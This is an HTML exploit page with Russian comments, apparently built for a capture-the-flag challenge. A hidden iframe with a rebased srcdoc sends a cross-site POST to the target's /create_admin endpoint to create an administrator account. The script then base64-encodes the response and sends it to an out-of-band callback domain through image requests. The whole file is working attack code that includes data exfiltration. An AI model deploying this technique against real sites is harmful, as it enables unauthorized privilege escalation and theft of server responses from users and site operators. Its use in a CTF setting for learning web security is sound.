<!DOCTYPE html>
<html>
<body>
<script>
// Создаем iframe с кодом, который сделает запрос С ТОГО ЖЕ ORIGIN
const iframe = document.createElement('iframe');
iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';

// ВАЖНО: srcdoc создает страницу с origin about:srcdoc или null
// Некоторые браузеры разрешают доступ из такого iframe
iframe.srcdoc = `
<!DOCTYPE html>
<html>
<head>
    <base href="https://tasks.goidactf.ru:20246/">
</head>
<body>
    <script>
        // Этот код выполняется в контексте iframe
        fetch('/create_admin', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'new_admin_login=srcdoc_test'
        })
        .then(r => r.text())
        .then(text => {
            // Отправляем результат родителю
            window.parent.postMessage({
                type: 'admin_response',
                data: text.substring(0, 300)
            }, '*');
        })
        .catch(e => {
            window.parent.postMessage({
                type: 'error',
                data: e.toString()
            }, '*');
        });
    <\/script>
</body>
</html>
`;

// Слушаем сообщения от iframe
window.addEventListener('message', (event) => {
    if (event.data && event.data.type) {
        // Отправляем на webhook
        const encoded = btoa(JSON.stringify(event.data)).substring(0, 40);
        new Image().src = `https://msg-${encoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
    }
});

document.body.appendChild(iframe);
new Image().src = 'https://srcdoc-loaded.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/';
</script>
</body>
</html>
